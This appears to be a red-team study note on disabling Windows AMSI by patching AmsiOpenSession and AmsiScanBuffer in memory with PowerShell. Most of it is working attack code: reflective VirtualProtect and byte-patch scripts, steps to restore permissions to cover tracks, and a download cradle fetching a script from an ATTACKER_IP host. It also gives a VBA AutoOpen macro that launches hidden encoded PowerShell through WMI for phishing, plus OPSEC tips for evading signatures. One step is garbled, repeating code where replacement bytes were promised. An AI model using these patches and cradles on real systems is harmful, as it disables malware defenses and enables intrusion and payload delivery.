---
title: Wrecking AMSI in PowerShell
draft: false
tags:
  - red-teaming
  - windows
  - amsi
  - powershell
  - evasion
  - binary-patching
---
 
In this section we'll modify the assembly instructions themselves instead of the data they are acting upon in a technique known as _binary patching_. We can use this technique to hotpatch the code and force it to fail even if the data structure is valid.

**Option 1**

1. Dump the contents of AmsiOpenSession (unassemble 0x1A bytes):
```bash
> u amsi!AmsiOpenSession L1A
00007fff`aa0824c0 4885d2          test    rdx,rdx
00007fff`aa0824c3 7446            je      amsi!AmsiOpenSession+0x4b (00007fff`aa08250b)
...
00007fff`aa08250b b857000780      mov     eax,80070057h
00007fff`aa082510 c3              ret
```

2. To force an error, we could just modify the first 2 bytes to the following instructions:
```bash
00007fff`aa08250b b857000780      mov     eax,80070057h
00007fff`aa082510 c3              ret
```

**Option 2**

The two first instructions in _AmsiOpenSession_ are a _TEST_ followed by a conditional jump. This specific conditional jump is called [_jump if equal_](https://faydoc.tripod.com/cpu/je.htm) (JE) and depends on a CPU flag called the [_zero flag_](https://en.wikipedia.org/wiki/Zero_flag) (ZF).

The conditional jump is controlled by the TEST instruction according to the argument and is executed if the zero flag is equal to 1. If we modify the TEST instruction to an [_XOR_](https://faydoc.tripod.com/cpu/xor.htm) instruction, we may force the Zero flag to be set to 1 and trick the CPU into taking the conditional jump that leads to the invalid argument return value.

XOR takes two registers as an argument but if we supply the same register as both the first and second argument, the operation will zero out the content of the register. The result of the operation controls the zero flag since if the result ends up being zero, the zero flag is set.

Overwrite the `TEST RDX,RDX` with an `XOR RAX,RAX` instruction, forcing the execution flow to the error branch, which will disable AMSI.

> [!Note]
> When the original `TEST RDX,RDX` instruction is compiled, it is converted into the binary value `0x4885d2`. This value takes up three bytes so the replacement, `XOR RAX,RAX` has to use up the same amount of memory.
> 
> `XOR RAX,RAX` is compiled into the binary value `0x4831c0`, which matches the number of bytes we require.

TODO: Search for any other instructions inside _AmsiOpenSession_ that could be overwritten just as easily to achieve the same goal.

1. Obtain the memory address of _AmsiOpenSession_ (via [_GetModuleHandle_](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea) to obtain the base address of **AMSI.DLL**, then call [_GetProcAddress_](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress))

We will use the same function as reflective PowerShell:
```powershell
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}
```

Usage:
```powershell
[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$funcAddr # address is in decimal
```

We can verify the address by opening WinDbg, attach to the PowerShell_ISE process and quickly translate the address to hexadecimal with the **?** command, prepending the address with **0n**:
```bash
? 0n140736475571392
Evaluate expression: 140736475571392 = 00007fff`c3a224c0
```

Now, unassemble the instructions at that address:
```bash
> u  7fff`c3a224c0 
00007fff`c3a224c0 4885d2          test    rdx,rdx
00007fff`c3a224c3 7446            je      amsi!AmsiOpenSession+0x4b (00007fff`c3a2250b)
...
```

2. Modify the memory permissions where _AmsiOpenSession_ is located:

First, verify the memory protections on the target address:
```bash
> !vprot 7FFFC3A224C0
BaseAddress:       00007fffc3a22000
AllocationBase:    00007fffc3a20000
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
RegionSize:        0000000000008000
State:             00001000  MEM_COMMIT
Protect:           00000020  "PAGE_EXECUTE_READ"
Type:              01000000  MEM_IMAGE
```

PAGE_EXECUTE_READ (0x20) = Read and Execute
PAGE_EXECUTE_READWRITE (0x40) = Read, Write and Execute

```powershell
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

# get function address
[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
# virtual protect win32 API:
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
# modify the address memory permissions:
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
```

3. Modify the three bytes at that location to inject `XOR RAX RAX` (0x48, 0x31, 0xC0)
```powershell
$buf = [Byte[]] (0x48, 0x31, 0xC0) 
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
```

Finally we'll restore the the previous memory permissions to cover tracks:
```powershell
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
```

Verification:
```bash
> u 7FFFC3A224C0

amsi!AmsiOpenSession:
00007fff`c3a224c0 4831c0          xor     rax,rax
00007fff`c3a224c3 7446            je      amsi!AmsiOpenSession+0x4b (00007fff`c3a2250b)

> !vprot 7FFFC3A224C0

BaseAddress:       00007fffc3a22000
AllocationBase:    00007fffc3a20000
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
RegionSize:        0000000000008000
State:             00001000  MEM_COMMIT
Protect:           00000020  "PAGE_EXECUTE_READ"
Type:              01000000  MEM_IMAGE
```

**Recreate as Download Cradle**

Save the complete `LookupFunc` + `getDelegateType` + patch block (already shown above) as a `.ps1` file on your Kali Apache server:

```bash
# Kali
sudo cp /path/to/amsi_patch.ps1 /var/www/html/
sudo systemctl start apache2
```

Download and execute from the victim (note: AMSI must not block the cradle itself — use the inline direct approach first, or encode the URL):

```powershell
# Victim PowerShell
IEX (New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP/amsi_patch.ps1')
```

> [!Note]
> The download cradle `DownloadString` + `IEX` is itself scanned by AMSI, creating a chicken-and-egg problem. A clean solution is to launch the download from a VBA macro via WMI (see [[Phishing with Microsoft Office]]), since the PowerShell process created by WMI starts fresh and the patch runs before any scanning occurs.

**VBA + WMI + AMSI bypass (combined approach)**

The strategy is to embed the binary-patch AMSI bypass inline in the PowerShell command launched via WMI from the macro, so the patch fires before any scanning of the download cradle occurs:

```vb
Sub MyMacro()
    ' Build the PowerShell command string (obfuscate in production using the
    ' Caesar/XOR encoder from [[Bypassing AV in Office]])
    Dim ps As String
    ps = "powershell -nop -w hidden -enc <BASE64_OF_PATCH_AND_CRADLE>"
    ' WMI launch decouples PowerShell from Word (no parent-child relationship)
    GetObject("winmgmts:").Get("Win32_Process").Create ps, Null, Null, pid
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

The `-enc` base64 payload encodes:
1. The `LookupFunc` and `getDelegateType` helpers
2. The `XOR RAX,RAX` patch block for `AmsiOpenSession`
3. The `IEX (DownloadString(...))` download cradle for the shellcode runner

Use PowerShell on Kali to generate the base64:
```bash
$cmd = Get-Content ./amsi_patch_and_cradle.ps1 -Raw
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
```

> [!Warning]
> OPSEC: Base64-encoded `-enc` payloads are heavily signatured. Apply the Caesar/XOR obfuscation from [[Bypassing AV in Office]] to the VBA strings, and consider splitting the base64 string across multiple variables to avoid single-string signatures.

**Extra Mile — Patch AmsiScanBuffer**

`AmsiScanBuffer` performs the actual content scan and returns the scan result. Patching it to return `S_OK` (0) makes every scan report clean.

Steps from reflective PowerShell:

```powershell
# 1. Get address of AmsiScanBuffer
[IntPtr]$sbAddr = LookupFunc amsi.dll AmsiScanBuffer

# 2. Make the page writable
$oldBuf = 0
$vp.Invoke($sbAddr, 3, 0x40, [ref]$oldBuf)

# 3. Patch: XOR EAX,EAX (31 C0) + RET (C3) = function returns 0 (S_OK) immediately
$patch = [Byte[]] (0x31, 0xC0, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $sbAddr, 3)

# 4. Restore page permissions
$vp.Invoke($sbAddr, 3, 0x20, [ref]$oldBuf)
```

Verify with WinDbg:
```bash
> u amsi!AmsiScanBuffer L3
# Should show: xor eax,eax / ret
```

> [!Note]
> Patching `AmsiScanBuffer` directly controls the scan result rather than the session setup. Both patch points are equally detectable; choose based on which is less signatured in the target environment.



---
# Related Notes

- [[Antimalware Scan Interface (AMSI)]] — AMSI architecture and Frida tracing
- [[Bypassing AMSI With Reflection in PowerShell]] — managed-code alternative
- [[Bypassing AMSI in JScript]] — JScript-specific bypass
- [[FodHelper UAC Bypass]] — uses AMSI bypass + shellcode runner
- [[Phishing with Microsoft Office]] — WMI dechaining referenced above
